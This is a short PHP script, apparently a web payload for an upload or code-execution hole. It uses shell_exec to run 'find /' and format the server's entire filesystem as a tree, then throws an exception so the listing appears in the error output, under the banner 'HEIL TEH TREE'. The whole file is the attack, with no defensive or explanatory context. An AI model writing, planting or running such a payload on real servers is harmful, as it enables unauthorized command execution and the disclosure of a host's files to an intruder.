<?php
$output ='';
$output =$output."\n HEIL TEH TREE ".shell_exec (' find / | sed -e "s/[^-][^\/]*\// |/g" -e "s/|\([^ ]\)/|-\1/" | xargs');



throw new Exception("\n SUCCESS  ". $output."\n");
?>
